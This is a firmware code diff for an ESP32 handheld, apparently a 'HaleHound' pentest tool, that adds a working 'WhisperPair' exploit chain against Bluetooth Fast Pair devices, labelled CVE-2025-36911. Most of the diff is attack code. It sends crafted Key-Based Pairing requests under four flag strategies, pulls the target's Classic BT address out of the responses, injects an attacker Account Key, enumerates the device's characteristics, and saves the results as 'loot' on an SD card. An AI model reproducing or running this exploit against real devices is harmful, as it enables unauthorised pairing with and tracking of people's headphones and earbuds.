@@ -20,6 +20,8 @@
 #include <WiFi.h>
 #include "skull_bg.h"
 #include "ble_database.h"
+#include <SD.h>
+#include "spi_manager.h"
 
 // ── Classic BT memory release ───────────────────────────────────────────
 // ESP32 Bluedroid reserves ~28KB for Classic BT by default.
@@ -5740,6 +5742,8 @@ static int wpProbeIdx = -1;
 static BLEScan* pWpScan = nullptr;
 static BLEClient* pWpClient = nullptr;
 static volatile bool wpNotifRx = false;
+static uint8_t wpNotifData[20];
+static size_t wpNotifLen = 0;
 
 // GATT UUIDs
 static BLEUUID wpFpUUID16((uint16_t)0xFE2C);
@@ -5749,6 +5753,55 @@ static BLEUUID wpKbpUUID("fe2c1234-8366-4814-8eb0-01de32100bea");
 // Icon bar
 static int wpIconX[2] = {210, 10};
 static int wpIconY = 20;
+
+// Attack-phase UUIDs created as locals in wpRunAttack() to save DRAM
+
+// ─── KBP Exploit Strategies ─────────────────────────────────────────────
+struct WPStrategy {
+    const char* name;
+    uint8_t flags;
+};
+
+static const WPStrategy wpStrategies[] = {
+    {"RAW_KBP",      0x11},
+    {"WITH_SEEKER",  0x02},
+    {"RETROACTIVE",  0x0A},
+    {"EXTENDED",     0x10},
+};
+
+// ─── Attack Result ──────────────────────────────────────────────────────
+struct WPAttackResult {
+    bool phase1Done;
+    bool phase2Done;
+    bool phase3Done;
+    int  strategyUsed;          // which strategy got first response (-1 = none)
+    uint8_t brEdrAddr[6];       // extracted BR/EDR (Classic BT) address
+    bool hasBrEdr;
+    uint8_t kbpResp[20];        // raw KBP notification response
+    size_t  kbpRespLen;
+    bool acctKeyWritten;        // Phase 2 success
+    uint8_t acctKey[16];        // the account key we injected
+    bool hasPasskey;            // Phase 3 — passkey char exists
+    bool hasAdditional;         // Phase 3 — additional data char exists
+    uint8_t modelIdBytes[3];    // from GATT char read
+    bool hasModelId;
+    char firmware[20];          // firmware revision string
+    bool hasFirmware;
+    uint8_t strategyResults[4]; // 0=not tried, 1=fail, 2=success
+};
+
+// ─── Attack State ───────────────────────────────────────────────────────
+static bool inAttack = false;
+static bool inAttackResult = false;
+static int  atkResultPage = 0;
+static WPAttackResult wpAtkResult;
+
+// ─── Attack Scrolling Log ───────────────────────────────────────────────
+#define WP_ATK_LOG_LINES 10
+#define WP_ATK_LOG_WIDTH 36
+static char wpAtkLog[WP_ATK_LOG_LINES][WP_ATK_LOG_WIDTH];
+static uint16_t wpAtkLogColors[WP_ATK_LOG_LINES];
+static int wpAtkLogCount = 0;
 
 // ─── Helpers ─────────────────────────────────────────────────────────────
 static const char* wpLookupModel(uint32_t mid) {
@@ -5784,8 +5837,12 @@ static uint16_t wpResultColor(uint8_t r) {
 // ─── Notification Callback ───────────────────────────────────────────────
 static void wpNotifyCb(BLERemoteCharacteristic* pChar, uint8_t* data, size_t len, bool isNotify) {
     wpNotifRx = true;
+    wpNotifLen = (len > 20) ? 20 : len;
+    memcpy(wpNotifData, data, wpNotifLen);
     #if CYD_DEBUG
     Serial.printf("[WP] KBP notification received! len=%d\n", len);
+    for (size_t i = 0; i < wpNotifLen; i++) Serial.printf("%02X ", wpNotifData[i]);
+    Serial.println();
     #endif
 }
 
@@ -5975,10 +6032,20 @@ static void wpDrawResult() {
             break;
     }
 
-    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
+    // Bottom bar with ATTACK button for vulnerable devices
+    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);
     tft.setTextColor(HALEHOUND_HOTPINK);
     tft.setCursor(5, SCREEN_HEIGHT - 12);
-    tft.print("BACK=Device List");
+    tft.print("BACK");
+
+    if (d.result == WPR_EXPOSED || d.result == WPR_VULNERABLE) {
+        tft.fillRoundRect(140, SCREEN_HEIGHT - 34, 92, 26, 4, 0xF800);
+        tft.drawRoundRect(139, SCREEN_HEIGHT - 35, 94, 28, 4, HALEHOUND_MAGENTA);
+        tft.drawBitmap(146, SCREEN_HEIGHT - 29, bitmap_icon_sword, 16, 16, HALEHOUND_BLACK);
+        tft.setTextColor(HALEHOUND_BLACK);
+        tft.setCursor(166, SCREEN_HEIGHT - 25);
+        tft.print("ATTACK");
+    }
 }
 
 // ─── Scan ────────────────────────────────────────────────────────────────
@@ -6217,6 +6284,666 @@ static void wpProbeDevice(int idx) {
     wpDrawResult();
 }
 
+// ─── Attack Log ──────────────────────────────────────────────────────────
+static void wpAtkAddLog(const char* msg, uint16_t color) {
+    if (wpAtkLogCount < WP_ATK_LOG_LINES) {
+        strncpy(wpAtkLog[wpAtkLogCount], msg, WP_ATK_LOG_WIDTH - 1);
+        wpAtkLog[wpAtkLogCount][WP_ATK_LOG_WIDTH - 1] = '\0';
+        wpAtkLogColors[wpAtkLogCount] = color;
+        wpAtkLogCount++;
+    } else {
+        for (int i = 0; i < WP_ATK_LOG_LINES - 1; i++) {
+            memcpy(wpAtkLog[i], wpAtkLog[i + 1], WP_ATK_LOG_WIDTH);
+            wpAtkLogColors[i] = wpAtkLogColors[i + 1];
+        }
+        strncpy(wpAtkLog[WP_ATK_LOG_LINES - 1], msg, WP_ATK_LOG_WIDTH - 1);
+        wpAtkLog[WP_ATK_LOG_LINES - 1][WP_ATK_LOG_WIDTH - 1] = '\0';
+        wpAtkLogColors[WP_ATK_LOG_LINES - 1] = color;
+    }
+}
+
+static void wpDrawAtkLog() {
+    int startY = 98;
+    int lineH = 15;
+    int drawCount = (wpAtkLogCount < WP_ATK_LOG_LINES) ? wpAtkLogCount : WP_ATK_LOG_LINES;
+    tft.fillRect(0, startY, SCREEN_WIDTH, WP_ATK_LOG_LINES * lineH, HALEHOUND_BLACK);
+    for (int i = 0; i < drawCount; i++) {
+        tft.setTextColor(wpAtkLogColors[i]);
+        tft.setCursor(5, startY + i * lineH);
+        tft.print(wpAtkLog[i]);
+    }
+}
+
+// ─── Attack Report Display ──────────────────────────────────────────────
+static void wpDrawAttackReport() {
+    if (wpProbeIdx < 0) return;
+    FPDevice& d = wpDevs[wpProbeIdx];
+
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+
+    if (atkResultPage == 0) {
+        // ─── Page 1: Summary ─────────────────────────────────────────
+        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+        tft.setTextColor(0xF800);
+        tft.setCursor(5, 82);
+        tft.print("ATTACK REPORT");
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.setCursor(SCREEN_WIDTH - 24, 82);
+        tft.print("1/2");
+        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);
+
+        int y = 100;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y); tft.print("Target: ");
+        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
+        y += 12;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y); tft.print("BLE: ");
+        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
+        y += 16;
+
+        // BR/EDR address — prominent
+        if (wpAtkResult.hasBrEdr) {
+            tft.fillRoundRect(5, y, SCREEN_WIDTH - 10, 28, 3, HALEHOUND_DARK);
+            tft.drawRoundRect(4, y - 1, SCREEN_WIDTH - 8, 30, 3, 0xF800);
+            tft.setTextColor(0xF800);
+            tft.setCursor(10, y + 3);
+            tft.print("BR/EDR:");
+            char brStr[20];
+            snprintf(brStr, sizeof(brStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                     wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
+                     wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
+                     wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
+            tft.setCursor(10, y + 15);
+            tft.setTextColor(HALEHOUND_HOTPINK);
+            tft.print(brStr);
+            y += 34;
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            tft.setCursor(5, y);
+            tft.print("BR/EDR: Not extracted");
+            y += 14;
+        }
+
+        y += 2;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Phase 1: KBP Exploit");
+        y += 12;
+
+        for (int s = 0; s < 4; s++) {
+            tft.setCursor(10, y);
+            tft.setTextColor(HALEHOUND_VIOLET);
+            tft.print(wpStrategies[s].name);
+            tft.setCursor(130, y);
+            if (wpAtkResult.strategyResults[s] == 2) {
+                tft.setTextColor(0x07E0);
+                tft.print("HIT");
+            } else if (wpAtkResult.strategyResults[s] == 1) {
+                tft.setTextColor(HALEHOUND_GUNMETAL);
+                tft.print("---");
+            } else {
+                tft.setTextColor(HALEHOUND_GUNMETAL);
+                tft.print("N/A");
+            }
+            y += 11;
+        }
+
+        y += 4;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Phase 2: ");
+        if (wpAtkResult.acctKeyWritten) {
+            tft.setTextColor(0x07E0);
+            tft.print("Key INJECTED");
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            tft.print("Key not written");
+        }
+        y += 14;
+
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Phase 3: ");
+        int intelCount = 0;
+        if (wpAtkResult.hasPasskey) intelCount++;
+        if (wpAtkResult.hasAdditional) intelCount++;
+        if (wpAtkResult.hasModelId) intelCount++;
+        if (wpAtkResult.hasFirmware) intelCount++;
+        char intelStr[16];
+        snprintf(intelStr, sizeof(intelStr), "%d chars found", intelCount);
+        tft.setTextColor(intelCount > 0 ? 0x07E0 : HALEHOUND_GUNMETAL);
+        tft.print(intelStr);
+
+    } else {
+        // ─── Page 2: Raw Data ────────────────────────────────────────
+        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+        tft.setTextColor(0xF800);
+        tft.setCursor(5, 82);
+        tft.print("RAW INTEL");
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.setCursor(SCREEN_WIDTH - 24, 82);
+        tft.print("2/2");
+        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);
+
+        int y = 100;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("KBP Response:");
+        y += 12;
+
+        if (wpAtkResult.kbpRespLen > 0) {
+            char hexLine[42];
+            for (int row = 0; row < 2; row++) {
+                int pos = 0;
+                for (int i = row * 8; i < (row + 1) * 8 && (size_t)i < wpAtkResult.kbpRespLen; i++) {
+                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
+                                    "%02X ", wpAtkResult.kbpResp[i]);
+                }
+                if (pos > 0) {
+                    hexLine[pos] = '\0';
+                    tft.setTextColor(HALEHOUND_HOTPINK);
+                    tft.setCursor(10, y);
+                    tft.print(hexLine);
+                    y += 11;
+                }
+            }
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            tft.setCursor(10, y);
+            tft.print("No response captured");
+            y += 11;
+        }
+
+        y += 6;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Account Key:");
+        y += 12;
+
+        if (wpAtkResult.acctKeyWritten) {
+            tft.drawBitmap(SCREEN_WIDTH - 22, y - 10, bitmap_icon_key, 16, 16, 0x07E0);
+            char hexLine[42];
+            for (int row = 0; row < 2; row++) {
+                int pos = 0;
+                for (int i = row * 8; i < (row + 1) * 8; i++) {
+                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
+                                    "%02X ", wpAtkResult.acctKey[i]);
+                }
+                hexLine[pos] = '\0';
+                tft.setTextColor(HALEHOUND_HOTPINK);
+                tft.setCursor(10, y);
+                tft.print(hexLine);
+                y += 11;
+            }
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            tft.setCursor(10, y);
+            tft.print("Not written");
+            y += 11;
+        }
+
+        y += 6;
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Firmware: ");
+        if (wpAtkResult.hasFirmware) {
+            tft.setTextColor(HALEHOUND_HOTPINK);
+            tft.print(wpAtkResult.firmware);
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            tft.print("Unknown");
+        }
+        y += 14;
+
+        tft.setTextColor(HALEHOUND_MAGENTA);
+        tft.setCursor(5, y);
+        tft.print("Model ID: ");
+        if (wpAtkResult.hasModelId) {
+            tft.setTextColor(HALEHOUND_HOTPINK);
+            char midStr[12];
+            snprintf(midStr, sizeof(midStr), "0x%02X%02X%02X",
+                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
+                     wpAtkResult.modelIdBytes[2]);
+            tft.print(midStr);
+        } else {
+            tft.setTextColor(HALEHOUND_GUNMETAL);
+            char mhex[12];
+            snprintf(mhex, sizeof(mhex), "0x%06X", d.modelId);
+            tft.print(mhex);
+        }
+    }
+
+    // Bottom navigation bar
+    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);
+
+    // SAVE button (left)
+    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, HALEHOUND_DARK);
+    tft.drawRoundRect(4, SCREEN_HEIGHT - 35, 72, 28, 4, HALEHOUND_MAGENTA);
+    tft.drawBitmap(10, SCREEN_HEIGHT - 29, bitmap_icon_save, 16, 16, HALEHOUND_HOTPINK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(30, SCREEN_HEIGHT - 25);
+    tft.print("SAVE");
+
+    // Page nav (right)
+    tft.setTextColor(HALEHOUND_VIOLET);
+    if (atkResultPage == 0) {
+        tft.setCursor(SCREEN_WIDTH - 55, SCREEN_HEIGHT - 25);
+        tft.print("1/2");
+        tft.drawBitmap(SCREEN_WIDTH - 22, SCREEN_HEIGHT - 29, bitmap_icon_RIGHT, 16, 16, HALEHOUND_VIOLET);
+    } else {
+        tft.drawBitmap(SCREEN_WIDTH - 60, SCREEN_HEIGHT - 29, bitmap_icon_LEFT, 16, 16, HALEHOUND_VIOLET);
+        tft.setCursor(SCREEN_WIDTH - 38, SCREEN_HEIGHT - 25);
+        tft.print("2/2");
+    }
+}
+
+// ─── SD Card Loot Save ──────────────────────────────────────────────────
+static void wpSaveLoot() {
+    if (wpProbeIdx < 0) return;
+    FPDevice& d = wpDevs[wpProbeIdx];
+
+    spiDeselect();
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);
+
+    if (!SD.begin(SD_CS)) {
+        SPI.begin(18, 19, 23, SD_CS);
+        if (!SD.begin(SD_CS, SPI, 4000000)) {
+            tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
+            tft.setTextColor(0xF800);
+            tft.setCursor(10, SCREEN_HEIGHT - 52);
+            tft.print("SD card not found!");
+            SD.end();
+            return;
+        }
+    }
+
+    if (!SD.exists("/wp_loot")) {
+        SD.mkdir("/wp_loot");
+    }
+
+    char safeMac[18];
+    strncpy(safeMac, d.addrStr, 17);
+    safeMac[17] = '\0';
+    for (int i = 0; i < 17; i++) {
+        if (safeMac[i] == ':') safeMac[i] = '-';
+    }
+
+    char fname[48];
+    snprintf(fname, sizeof(fname), "/wp_loot/%s_%lu.txt", safeMac, millis());
+
+    File f = SD.open(fname, FILE_WRITE);
+    if (!f) {
+        tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
+        tft.setTextColor(0xF800);
+        tft.setCursor(10, SCREEN_HEIGHT - 52);
+        tft.print("File write failed!");
+        SD.end();
+        return;
+    }
+
+    f.println("========================================");
+    f.println("  WHISPERPAIR ATTACK REPORT");
+    f.println("  CVE-2025-36911 Exploit Chain");
+    f.println("  HaleHound Edition");
+    f.println("========================================");
+    f.println();
+    f.printf("Target:  %s\n", d.name);
+    f.printf("BLE MAC: %s\n", d.addrStr);
+    f.printf("RSSI:    %d dBm\n", d.rssi);
+    f.printf("Model:   0x%06X\n", d.modelId);
+    f.println();
+
+    if (wpAtkResult.hasBrEdr) {
+        f.printf("BR/EDR Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                 wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
+                 wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
+                 wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
+    } else {
+        f.println("BR/EDR Address: Not extracted");
+    }
+    f.println();
+
+    f.println("-- Phase 1: KBP Exploit --");
+    for (int s = 0; s < 4; s++) {
+        const char* status = "N/A";
+        if (wpAtkResult.strategyResults[s] == 2) status = "HIT";
+        else if (wpAtkResult.strategyResults[s] == 1) status = "MISS";
+        f.printf("  %s: %s\n", wpStrategies[s].name, status);
+    }
+    f.println();
+
+    if (wpAtkResult.kbpRespLen > 0) {
+        f.print("KBP Response: ");
+        for (size_t i = 0; i < wpAtkResult.kbpRespLen; i++) {
+            f.printf("%02X ", wpAtkResult.kbpResp[i]);
+        }
+        f.println();
+    }
+    f.println();
+
+    f.println("-- Phase 2: Account Key --");
+    if (wpAtkResult.acctKeyWritten) {
+        f.print("  Key: ");
+        for (int i = 0; i < 16; i++) {
+            f.printf("%02X ", wpAtkResult.acctKey[i]);
+        }
+        f.println();
+        f.println("  Status: INJECTED");
+    } else {
+        f.println("  Status: Not written");
+    }
+    f.println();
+
+    f.println("-- Phase 3: Intel --");
+    f.printf("  Passkey char: %s\n", wpAtkResult.hasPasskey ? "Found" : "Absent");
+    f.printf("  AdditionalData: %s\n", wpAtkResult.hasAdditional ? "Found" : "Absent");
+    if (wpAtkResult.hasModelId) {
+        f.printf("  Model ID: 0x%02X%02X%02X\n",
+                 wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
+                 wpAtkResult.modelIdBytes[2]);
+    }
+    if (wpAtkResult.hasFirmware) {
+        f.printf("  Firmware: %s\n", wpAtkResult.firmware);
+    }
+    f.println();
+    f.println("========================================");
+
+    f.close();
+    SD.end();
+
+    // Show save confirmation on screen
+    tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
+    tft.setTextColor(0x07E0);
+    tft.setCursor(10, SCREEN_HEIGHT - 52);
+    tft.print("Saved: ");
+    char shortName[28];
+    snprintf(shortName, sizeof(shortName), "/wp_loot/%.18s", safeMac);
+    tft.print(shortName);
+}
+
+// ─── Main Attack Orchestrator ───────────────────────────────────────────
+static void wpRunAttack() {
+    if (wpProbeIdx < 0 || wpProbeIdx >= wpCount) return;
+    FPDevice& d = wpDevs[wpProbeIdx];
+
+    inAttack = true;
+    inResult = false;
+    wpAtkLogCount = 0;
+    memset(&wpAtkResult, 0, sizeof(wpAtkResult));
+    wpAtkResult.strategyUsed = -1;
+
+    // Draw attack UI
+    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
+    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
+    tft.setTextColor(0xF800);
+    tft.setCursor(5, 82);
+    tft.print("ATTACKING: ");
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    String atkName = String(d.name).substring(0, 16);
+    tft.print(atkName);
+    tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);
+
+    if (pWpScan) pWpScan->stop();
+
+    wpAtkAddLog("Connecting...", HALEHOUND_HOTPINK);
+    wpDrawAtkLog();
+
+    if (!pWpClient) {
+        pWpClient = BLEDevice::createClient();
+    }
+    if (!pWpClient) {
+        wpAtkAddLog("Client create FAILED", 0xF800);
+        wpDrawAtkLog();
+        delay(2000);
+        inAttack = false;
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    BLEAddress addr(d.addrStr);
+    bool connected = pWpClient->connect(addr, d.addrType);
+    if (!connected) {
+        wpAtkAddLog("Connection FAILED", 0xF800);
+        wpDrawAtkLog();
+        delay(2000);
+        inAttack = false;
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
+    wpDrawAtkLog();
+
+    // Find FP service
+    wpAtkAddLog("Finding FP service...", HALEHOUND_HOTPINK);
+    wpDrawAtkLog();
+
+    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
+    if (!pSvc) pSvc = pWpClient->getService(wpFpUUID16);
+
+    if (!pSvc) {
+        wpAtkAddLog("FP service NOT FOUND", 0xF800);
+        wpDrawAtkLog();
+        pWpClient->disconnect();
+        delay(2000);
+        inAttack = false;
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    wpAtkAddLog("FP service found!", HALEHOUND_MAGENTA);
+    wpDrawAtkLog();
+
+    // Find KBP characteristic
+    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);
+    if (!pKbp) {
+        wpAtkAddLog("KBP char NOT FOUND", 0xF800);
+        wpDrawAtkLog();
+        pWpClient->disconnect();
+        delay(2000);
+        inAttack = false;
+        inResult = true;
+        wpDrawResult();
+        return;
+    }
+
+    if (pKbp->canNotify()) {
+        pKbp->registerForNotify(wpNotifyCb);
+        delay(100);
+    }
+
+    wpAtkAddLog("KBP char ready", HALEHOUND_MAGENTA);
+    wpDrawAtkLog();
+
+    // Attack-phase UUIDs (stack locals to save DRAM)
+    BLEUUID uuidPasskey("fe2c1235-8366-4814-8eb0-01de32100bea");
+    BLEUUID uuidAcctKey("fe2c1236-8366-4814-8eb0-01de32100bea");
+    BLEUUID uuidAdditional("fe2c1237-8366-4814-8eb0-01de32100bea");
+    BLEUUID uuidModelId("fe2c1233-8366-4814-8eb0-01de32100bea");
+    BLEUUID uuidDevInfo((uint16_t)0x180A);
+    BLEUUID uuidFwRev((uint16_t)0x2A26);
+
+    // ─── Phase 1: Multi-Strategy KBP Exploit ─────────────────────
+    wpAtkAddLog("--- PHASE 1: KBP EXPLOIT ---", 0xF800);
+    wpDrawAtkLog();
+
+    uint8_t addrBytes[6];
+    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &addrBytes[0], &addrBytes[1], &addrBytes[2],
+           &addrBytes[3], &addrBytes[4], &addrBytes[5]);
+
+    for (int s = 0; s < 4; s++) {
+        char logBuf[WP_ATK_LOG_WIDTH];
+        snprintf(logBuf, sizeof(logBuf), "Strategy %d: %s", s + 1, wpStrategies[s].name);
+        wpAtkAddLog(logBuf, HALEHOUND_HOTPINK);
+        wpDrawAtkLog();
+
+        uint8_t kbpReq[16];
+        memset(kbpReq, 0, 16);
+        kbpReq[0] = 0x00;  // KBP Request message type
+        kbpReq[1] = wpStrategies[s].flags;
+        memcpy(&kbpReq[4], addrBytes, 6);
+        for (int i = 10; i < 16; i++) kbpReq[i] = (uint8_t)random(256);
+
+        wpNotifRx = false;
+        wpNotifLen = 0;
+
+        if (pKbp->canWrite()) {
+            pKbp->writeValue(kbpReq, 16, true);
+        } else {
+            pKbp->writeValue(kbpReq, 16, false);
+        }
+
+        unsigned long t0 = millis();
+        while (millis() - t0 < 2000 && !wpNotifRx) {
+            delay(50);
+        }
+
+        if (wpNotifRx) {
+            wpAtkResult.strategyResults[s] = 2;
+            snprintf(logBuf, sizeof(logBuf), "  RESPONSE! %d bytes", (int)wpNotifLen);
+            wpAtkAddLog(logBuf, 0x07E0);
+            wpDrawAtkLog();
+
+            if (wpAtkResult.strategyUsed < 0) {
+                wpAtkResult.strategyUsed = s;
+                memcpy(wpAtkResult.kbpResp, wpNotifData, wpNotifLen);
+                wpAtkResult.kbpRespLen = wpNotifLen;
+
+                if (wpNotifLen >= 7) {
+                    memcpy(wpAtkResult.brEdrAddr, &wpNotifData[1], 6);
+                    wpAtkResult.hasBrEdr = true;
+                    char brStr[32];
+                    snprintf(brStr, sizeof(brStr), "BR/EDR: %02X:%02X:%02X:%02X:%02X:%02X",
+                             wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
+                             wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
+                             wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
+                    wpAtkAddLog(brStr, 0xF800);
+                    wpDrawAtkLog();
+                }
+            }
+        } else {
+            wpAtkResult.strategyResults[s] = 1;
+            wpAtkAddLog("  No response", HALEHOUND_GUNMETAL);
+            wpDrawAtkLog();
+        }
+
+        delay(300);
+    }
+
+    wpAtkResult.phase1Done = true;
+
+    // ─── Phase 2: Account Key Injection ──────────────────────────
+    wpAtkAddLog("--- PHASE 2: ACCT KEY ---", 0xF800);
+    wpDrawAtkLog();
+
+    BLERemoteCharacteristic* pAcctKey = pSvc->getCharacteristic(uuidAcctKey);
+    if (pAcctKey) {
+        for (int i = 0; i < 16; i++) {
+            wpAtkResult.acctKey[i] = (uint8_t)random(256);
+        }
+
+        wpAtkAddLog("Writing Account Key...", HALEHOUND_HOTPINK);
+        wpDrawAtkLog();
+
+        if (pAcctKey->canWrite()) {
+            pAcctKey->writeValue(wpAtkResult.acctKey, 16, true);
+        } else {
+            pAcctKey->writeValue(wpAtkResult.acctKey, 16, false);
+        }
+
+        wpAtkResult.acctKeyWritten = true;
+        wpAtkAddLog("Account Key INJECTED!", 0x07E0);
+        wpDrawAtkLog();
+    } else {
+        wpAtkAddLog("AcctKey char not found", HALEHOUND_GUNMETAL);
+        wpDrawAtkLog();
+    }
+
+    wpAtkResult.phase2Done = true;
+
+    // ─── Phase 3: Characteristic Enumeration ─────────────────────
+    wpAtkAddLog("--- PHASE 3: INTEL ---", 0xF800);
+    wpDrawAtkLog();
+
+    // Passkey char
+    BLERemoteCharacteristic* pPk = pSvc->getCharacteristic(uuidPasskey);
+    wpAtkResult.hasPasskey = (pPk != nullptr);
+    wpAtkAddLog(pPk ? "Passkey char: FOUND" : "Passkey char: absent",
+                pPk ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
+    wpDrawAtkLog();
+
+    // Additional Data char
+    BLERemoteCharacteristic* pAd = pSvc->getCharacteristic(uuidAdditional);
+    wpAtkResult.hasAdditional = (pAd != nullptr);
+    wpAtkAddLog(pAd ? "AdditionalData: FOUND" : "AdditionalData: absent",
+                pAd ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
+    wpDrawAtkLog();
+
+    // Model ID char
+    BLERemoteCharacteristic* pMid = pSvc->getCharacteristic(uuidModelId);
+    if (pMid && pMid->canRead()) {
+        std::string mv = pMid->readValue();
+        if (mv.length() >= 3) {
+            memcpy(wpAtkResult.modelIdBytes, mv.data(), 3);
+            wpAtkResult.hasModelId = true;
+            char midStr[32];
+            snprintf(midStr, sizeof(midStr), "Model ID: 0x%02X%02X%02X",
+                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
+                     wpAtkResult.modelIdBytes[2]);
+            wpAtkAddLog(midStr, HALEHOUND_MAGENTA);
+        } else {
+            wpAtkAddLog("Model ID: short read", HALEHOUND_GUNMETAL);
+        }
+    } else {
+        wpAtkAddLog("Model ID: not readable", HALEHOUND_GUNMETAL);
+    }
+    wpDrawAtkLog();
+
+    // Firmware Revision (Device Info Service 0x180A, char 0x2A26)
+    BLERemoteService* pDis = pWpClient->getService(uuidDevInfo);
+    if (pDis) {
+        BLERemoteCharacteristic* pFw = pDis->getCharacteristic(uuidFwRev);
+        if (pFw && pFw->canRead()) {
+            std::string fv = pFw->readValue();
+            if (fv.length() > 0) {
+                size_t copyLen = fv.length();
+                if (copyLen > 19) copyLen = 19;
+                memcpy(wpAtkResult.firmware, fv.data(), copyLen);
+                wpAtkResult.firmware[copyLen] = '\0';
+                wpAtkResult.hasFirmware = true;
+                char fwStr[42];
+                snprintf(fwStr, sizeof(fwStr), "FW: %.19s", wpAtkResult.firmware);
+                wpAtkAddLog(fwStr, HALEHOUND_MAGENTA);
+            }
+        } else {
+            wpAtkAddLog("FW Rev: not readable", HALEHOUND_GUNMETAL);
+        }
+    } else {
+        wpAtkAddLog("DevInfo svc: absent", HALEHOUND_GUNMETAL);
+    }
+    wpDrawAtkLog();
+
+    wpAtkResult.phase3Done = true;
+
+    // Disconnect
+    pWpClient->disconnect();
+
+    wpAtkAddLog("=== ATTACK COMPLETE ===", 0xF800);
+    wpDrawAtkLog();
+    delay(1500);
+
+    inAttack = false;
+    inAttackResult = true;
+    atkResultPage = 0;
+    wpDrawAttackReport();
+}
+
 // ─── Public Interface ────────────────────────────────────────────────────
 void setup() {
     if (wpInit) return;
@@ -6273,7 +7000,14 @@ void loop() {
             if (ty >= 20 && ty <= 36) {
                 if (tx >= 10 && tx < 26) {
                     // Back icon
-                    if (inResult) {
+                    if (inAttackResult) {
+                        inAttackResult = false;
+                        inResult = true;
+                        tft.fillScreen(HALEHOUND_BLACK);
+                        drawStatusBar();
+                        wpDrawHeader();
+                        wpDrawResult();
+                    } else if (inResult) {
                         inResult = false;
                         tft.fillScreen(HALEHOUND_BLACK);
                         drawStatusBar();
@@ -6287,7 +7021,7 @@ void loop() {
                 }
                 else if (tx >= 210 && tx < 226) {
                     // Rescan icon
-                    if (!inResult) {
+                    if (!inResult && !inAttackResult) {
                         wpDoScan();
                     }
                     lastTap = millis();
@@ -6299,7 +7033,14 @@ void loop() {
 
     // Button handling
     if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
-        if (inResult) {
+        if (inAttackResult) {
+            inAttackResult = false;
+            inResult = true;
+            tft.fillScreen(HALEHOUND_BLACK);
+            drawStatusBar();
+            wpDrawHeader();
+            wpDrawResult();
